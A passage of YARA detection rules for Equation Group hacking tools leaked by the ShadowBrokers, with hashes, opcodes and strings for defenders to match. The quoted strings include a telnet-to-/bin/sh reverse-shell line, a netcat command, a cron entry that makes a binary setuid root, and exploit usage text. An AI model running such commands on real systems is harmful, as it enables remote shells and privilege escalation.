description = "Equation Group hack tool leaked by ShadowBrokers- file smash"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "1dc94b46aaff06d65a3bf724c8701e5f095c1c9c131b65b2f667e11b1f0129a6"
strings:
$x1 = "T=<target IP> [O=<port>] Y=<target type>" fullword ascii
$x2 = "no command given!! bailing..." fullword ascii
$x3 = "no port. assuming 22..." fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "087db4f2dbf8e0679de421fec8fb2e6dd50625112eb232e4acc1408cc0bcd2d7"
strings:
$op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 }
$op2 = { 44 24 33 6f c6 44 24 34 77 c6 }
$op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e }
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Gen1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "1b5b33931eb29733a42d18d8ee85b5cd7d53e81892ff3e60e2e97f3d0b184d31"
hash2 = "139697168e4f0a2cc73105205c0ddc90c357df38d93dbade761392184df680c7"
strings:
$x1 = "Restart with the new protocol, address, and port as target." fullword ascii
$x2 = "TargetPort      : %s (%u)" fullword ascii
$x3 = "Error: strchr() could not find '@' in account name." fullword ascii
$x4 = "TargetAcctPwd   : %s" fullword ascii
$x5 = "Creating CURL connection handle..." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Mofconfig_1_0_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c67a24fe2380331a101d27d6e69b82d968ccbae54a89a2629b6c135436d7bdb2"
strings:
$x1 = "[-] Get RemoteMOFTriggerPath error" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}
rule SSC_EquationGroup_charm_saver_win2k_v_2_0_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "0f7936a37482532a8ba5df4112643ed7579dd0e59181bfca9c641b9ba0a9912f"
strings:
$s2 = "0123456789abcdefABCEDF:" fullword ascii
$op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } /* Opcode */
$op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DmGz_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "5964966041f93d5d0fb63ce4a85cf9f7a73845065e10519b0947d4a065fdbdf2"
strings:
$s1 = "\\\\.\\%ls" fullword ascii
$s3 = "6\"6<6C6H6M6Z6f6t6" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_ParseCapture {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c732d790088a4db148d3291a92de5a449e409704b12e00c7508d75ccd90a03f2"
strings:
$x1 = "* Encrypted log found.  An encryption key must be provided" fullword ascii
$x2 = "encryptionkey = e.g., \"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\"" fullword ascii
$x3 = "Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Architouch_1_0_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc"
strings:
$s1 = "[+] Target is %s" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_wrap_telnet {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "4962b307a42ba18e987d82aa61eba15491898978d0e2f0e4beb02371bf0fd5b4"
strings:
$s1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\"" fullword ascii
$s2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
$s3 = "echo \"Call back port2 = ${SPORT}\"" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 4KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "46da99d80fc3eae5d1d5ab2da02ed7e61416e1eafeb23f37b180c46e9eff8a1c"
strings:
$x1 = "[-] The target is NOT vulnerable" fullword ascii
$x2 = "[+] The target IS VULNERABLE" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_PacketScan_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "9b97cac66d73a9d268a15e47f84b3968b1f7d3d6b68302775d27b99a56fbb75a"
strings:
$op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff }
$op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 }
$op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 }
condition:
( uint16(0) == 0x5a4d and filesize < 30KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_yak {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "66ff332f84690642f4e05891a15bf0c9783be2a64edb2ef2d04c9205b47deb19"
strings:
$x1 = "-xd = dump archive data & store in scancodes.txt" fullword ascii
$x2 = "-------- driver start token -------" fullword wide
$x3 = "-------- keystart token -------" fullword wide
$x4 = "-xta = same as -xt but show special chars & store in keys_all.txt" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 800KB and 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc"
hash2 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
hash3 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
strings:
$s1 = "NtErrorMoreProcessingRequired" fullword ascii
$s2 = "Command Format Error: Error=%x" fullword ascii
$s3 = "NtErrorPasswordRestriction" fullword ascii
$op0 = { 8a 85 58 ff ff ff 88 43 4d }
condition:
( uint16(0) == 0x5a4d and filesize < 600KB and 2 of them )
}
rule SSC_EquationGroup__funnelout_v4_1_0_1 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash2 = "457ed14e806fdbda91c4237c8dc058c55e5678f1eecdd78572eff6ca0ed86d33"
strings:
$s1 = "header(\"Set-Cookie: bbsessionhash=\" . \\$hash . \"; path=/; HttpOnly\");" fullword ascii
$s2 = "if ($code =~ /proxyhost/) {" fullword ascii
$s3 = "\\$rk[1] = \\$rk[1] - 1;" fullword ascii
$s4 = "#existsUser($u) or die \"User '$u' does not exist in database.\\n\";" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_RemoteCommand_Lp {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "57b47613a3b5dd820dae59fc6dc2b76656bd578f015f367675219eb842098846"
strings:
$s1 = "Failure parsing command from %hs:%u: os=%u plugin=%u" fullword wide
$s2 = "Unable to get TCP listen port: %08x" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_GenKey {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "b6f100b21da4f7e3927b03b8b5f0c595703b769d5698c835972ca0c81699ff71"
strings:
$x1 = "* PrivateEncrypt -> PublicDecrypt FAILED" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_PC_LP {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "3a505c39acd48a258f4ab7902629e5e2efa8a2120a4148511fe3256c37967296"
strings:
$s1 = "* Failed to get connection information.  Aborting launcher!" fullword wide
$s2 = "Format: <command> <target port> [lp port]" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_watcher_linux_x86_64_v_3_3_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3"
strings:
$s1 = "forceprismheader" fullword ascii
$s2 = "invalid option `" fullword ascii
$s3 = "forceprism" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 900KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_EXPA {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "2017176d3b5731a188eca1b71c50fb938c19d6260c9ff58c7c9534e317d315f8"
strings:
$x1 = "* The target is IIS 6.0 but is not running content indexing servicess," fullword ascii
$x2 = "--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL" fullword ascii
$x3 = "By default, the shellcode will attempt to immediately connect s$" fullword ascii
$x4 = "UNEXPECTED SHELLCODE CONFIGURATION ERRORs" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ELV_ESKE_13 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f"
hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
strings:
$x1 = "Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored." fullword ascii
$s2 = "ERROR: pGvars->pIntRideAreaImplantPayload is NULL" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them )
}
rule SSC_EquationGroup_ratload {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398"
strings:
$x1 = "/tmp/ratload.tmp.sh" fullword ascii
$x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
$s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_calserver {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file calserver"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "048625e9a0ca46d7fe221e262c8dd05e7a5339990ffae2fb65a9b0d705ad6099"
strings:
$x1 = "usage: %s <host> <port> e <contents of a local file to be executed on target>" fullword ascii
$x2 = "Writing your %s to target." fullword ascii
$x3 = "(e)xploit, (r)ead, (m)ove and then write, (w)rite" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 30KB and 1 of them )
}
rule SSC_EquationGroup_telex {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file telex"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef"
strings:
$x1 = "usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>" fullword ascii
$x2 = "target is not vulnerable. exiting" fullword ascii
$s3 = "Sending final buffer: evil_blocks and shellcode..." fullword ascii
$s4 = "Timeout waiting for daemon to die.  Exploit probably failed." fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 50KB and 1 of them )
}
rule SSC_EquationGroup_ebbisland {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file ebbisland"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "eba07c98c7e960bb6c71dafde85f5da9f74fd61bc87793c87e04b1ae2d77e977"
strings:
$x1 = "Usage: %s [-V] -t <target_ip> -p port" fullword ascii
$x2 = "error - shellcode not as expected - unable to fix up" fullword ascii
$x3 = "WARNING - core wipe mode - this will leave a core file on target" fullword ascii
$x4 = "[-C] wipe target core file (leaves less incriminating core on failed target)" fullword ascii
$x5 = "-A <jumpAddr> (shellcode address)" fullword ascii
$x6 = "*** Insane undocumented incremental port mode!!! ***" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_morerats_client_addkey {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "6c67c03716d06a99f20c1044585d6bde7df43fee89f38915db0b03a42a3a9f4b"
strings:
$x1 = "print '  -s storebin  use storebin as the Store executable\\n'" fullword ascii
$x2 = "os.system('%s --file=\"%s\" --wipe > /dev/null' % (storebin, b))" fullword ascii
$x3 = "print '  -k keyfile   the key text file to inject'" fullword ascii
condition:
( filesize < 20KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "729eacf20fe71bd74e57a6b829b45113c5d45003933118b53835779f0b049bad"
strings:
$x1 = "[-] Unable to connect to broswer named pipe, target is NOT vulnerable" fullword ascii
$x2 = "[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable" fullword ascii
$x3 = "[+] Bound to Dimsvc, target IS vulnerable" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 30KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Gen2 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "7fe425cd040608132d4f4ab2671e04b340a102a20c97ffdcf1b75be43a9369b5"
hash2 = "561c0d4fc6e0ff0a78613d238c96aed4226fbb7bb9ceea1d19bc770207a6be1e"
hash3 = "f2e90e04ddd05fa5f9b2fec024cd07365aebc098593d636038ebc2720700662b"
hash4 = "8f7e10a8eedea37ee3222c447410fd5b949bd352d72ef22ef0b2821d9df2f5ba"
strings:
$s1 = "[+] Setting password : (NULL)" fullword ascii
$s2 = "[-] TbBuffCpy() failed!" fullword ascii
$s3 = "[+] SMB negotiation" fullword ascii
$s4 = "12345678-1234-ABCD-EF00-0123456789AB" fullword ascii
$s5 = "Value must end with 0000 (2 NULLs)" fullword ascii
$s6 = "[*] Configuring Payload" fullword ascii
$s7 = "[*] Connecting to listener" fullword ascii
$op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 }
$op2 = { eb 59 8b 4c 24 10 68 1c 46 }
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and 1 of ($s*) and 1 of ($op*) ) or 3 of them
}
rule SSC_EquationGroup_Toolset_Apr17_wmi_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "de08d6c382faaae2b4b41b448b26d82d04a8f25375c712c12013cb0fac3bc704"
strings:
$x1 = "SELECT ProcessId,Description,ExecutablePath FROM Win32_Process" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}
rule SSC_EquationGroup_envisioncollision {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file envisioncollision"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "75d5ec573afaf8064f5d516ae61fd105012cbeaaaa09c8c193c7b4f9c0646ea1"
strings:
$x1 = "mysql \\$D --host=\\$H --user=\\$U --password=\\\"\\$P\\\" -e \\\"select * from \\$T" fullword ascii
$x2 = "Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\"sleep 500|nc" fullword ascii
$s3 = "$ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");" fullword ascii
$s4 = "$url = $host . \"/admin/index.php?adsess=\" . $enter . \"&app=core&module=applications&section=hooks&do=install_hook\";" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 20KB and 1 of ($x*) ) or ( 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "f4b958a0d3bb52cb34f18ea293d43fa301ceadb4a259d3503db912d0a9a1e4d8"
strings:
$x1 = "[!] A vulnerable target will not respond." fullword ascii
$x2 = "[-] Target NOT Vulernable" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 30KB and 1 of them )
}
rule SSC_EquationGroup_porkserver_v3_0_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "7b5f86e289047dd673e8a09438d49ec43832b561bac39b95098f5bf4095b8b4a"
strings:
$s1 = "%s: %s rpcprog=%d, rpcvers = %d/%d, proto=%s, wait.max=%d.%d, user.group=%s.%s builtin=%lx server=%s" fullword ascii
$s2 = "%s/%s server failing (looping), service terminated" fullword ascii
$s3 = "getpwnam: %s: No such user" fullword ascii
$s4 = "execv %s: %m" fullword ascii
$s5 = "%s/%s: getsockname: %m" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 70KB and 4 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "cb5849fcbc473c7df886828d225293ffbd8ee58e221d03b840fd212baeda6e89"
hash2 = "043d1c9aae6be65f06ab6f0b923e173a96b536cf84e57bfd7eeb9034cd1df8ea"
strings:
$s1 = "[*] Summary: %d pipes found" fullword ascii
$s3 = "[+] Testing %d pipes" fullword ascii
$s6 = "[-] Error on SMB startup, aborting" fullword ascii
$s12 = "92a761c29b946aa458876ff78375e0e28bc8acb0" fullword ascii
$op1 = { 68 10 10 40 00 56 e8 e1 }
condition:
( uint16(0) == 0x5a4d and filesize < 40KB and 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SetCallback {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "a8854f6b01d0e49beeb2d09e9781a6837a0d18129380c6e1b1629bc7c13fdea2"
strings:
$s2 = "*NOTE: This version of SetCallback does not work with PeddleCheap versions prior" fullword ascii
$s3 = "USAGE: SetCallback <input file> <output file>" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}
rule SSC_EquationGroup_jscan {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file jscan"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "8075f56e44185e1be26b631a2bad89c5e4190c2bfc9fa56921ea3bbc51695dbe"
strings:
$s1 = "$scanth = $scanth . \" -s \" . $scanthreads;" fullword ascii
$s2 = "print \"java -jar jscanner.jar$scanth$list\\n\";" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_PC_Level_Generic {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "7a6488dd13936e505ec738dcc84b9fec57a5e46aab8aff59b8cfad8f599ea86a"
hash2 = "0e3cfd48732d0b301925ea3ec6186b62724ec755ed40ed79e7cd6d3df511b8a0"
hash3 = "d1d6e3903b6b92cc52031c963e2031b5956cadc29cc8b3f2c8f38be20f98a4a7"
hash4 = "25a2549031cb97b8a3b569b1263c903c6c0247f7fff866e7ec63f0add1b4921c"
hash5 = "591abd3d7ee214df25ac25682b673f02219da108d1384261052b5167a36a7645"
hash6 = "6b71db2d2721ac210977a4c6c8cf7f75a8f5b80b9dbcece1bede1aec179ed213"
hash7 = "7be4c05cecb920f1010fc13086635591ad0d5b3a3a1f2f4b4a9be466a1bd2b76"
hash8 = "f9cbccdbdf9ffd2ebf1ee84d0ddddd24a61dbe0858ab7f0131bef6c7b9a19131"
hash9 = "3cf7a01bdf8e73769c80b75ca269b506c33464d81f574ded8bb20caec2d4cd13"
hash10 = "a87a871fe32c49862ed68fda99d92efd762a33ababcd9b6b2b909f2e01f59c16"
strings:
$s1 = "wshtcpip.WSHGetSocketInformation" fullword ascii
$s2 = "\\\\.\\%hs" fullword ascii
$s3 = ".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@" fullword ascii
$s4 = "Corporation. All rights reserved." fullword wide
$s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 }
$op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 }
$op2 = { c6 44 24 56 64 88 5c 24 57 }
$op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f }
condition:
uint16(0) == 0x5a4d and filesize < 400KB and ( 2 of ($s*) or all of ($op*) )
}
rule SSC_EquationGroup_Toolset_Apr17_Processes_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "69cf7643dbecc5f9b4b29edfda6c0295bc782f0e438f19be8338426f30b4cc74"
strings:
$s1 = "Select * from Win32_Process" fullword ascii
$s3 = "\\\\%ls\\root\\cimv2" fullword wide
$s5 = "%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
hash2 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
hash3 = "7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309"
strings:
$x1 = "ERROR: Connection terminated by Target (TCP Ack/Fin)" fullword ascii
$s2 = "Target did not respond within specified amount of time" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Iistouch_1_2_2 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c433507d393a8aa270576790acb3e995e22f4ded886eb9377116012e247a07c6"
strings:
$x1 = "[-] Are you being redirectect? Need to retarget?" fullword ascii
$x2 = "[+] IIS Target OS: %s" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 60KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "26215bc56dc31d2466d72f1f4e1b6388e62606e9949bc41c28968fcb9a9d60a6"
hash2 = "fcfb56fa79d2383d34c471ef439314edc2239d632a880aa2de3cea430f6b5665"
hash3 = "a5ec4d102d802ada7c5083af53fd9d3c9b5aa83be9de58dbb4fac7876faf6d29"
strings:
$s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
$s2 = "\\DosDevices\\%ws" fullword wide
$s3 = "\\Device\\%ws_%ws" fullword wide
$s4 = "sys\\mstcp32.dbg" fullword ascii
$s5 = "%ws%03d%ws%wZ" fullword wide
$s6 = "TCP/IP driver" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 4 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ETBL_ETRE_10 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef"
hash2 = "e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2"
strings:
$x1 = "Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword" fullword ascii
$x6 = "** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X" fullword ascii
$s19 = "Sending Implant Payload.. cEncImplantPayload size(%d)" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup__jparsescan_parsescan_5 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
hash2 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
strings:
$s1 = "# default is to dump out all scanned hosts found" fullword ascii
$s2 = "$bool .= \" -r \" if (/mibiisa.* -r/);" fullword ascii
$s3 = "sadmind is available on two ports, this also works)" fullword ascii
$s4 = "-x IP      gives \\\"hostname:# users:load ...\\\" if positive xwin scan" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )
}
rule SSC_EquationGroup_elgingamble {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file elgingamble"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd"
strings:
$x1 = "* * * * * root chown root %s; chmod 4755 %s; %s" fullword ascii
$x2 = "[-] kernel not vulnerable" fullword ascii
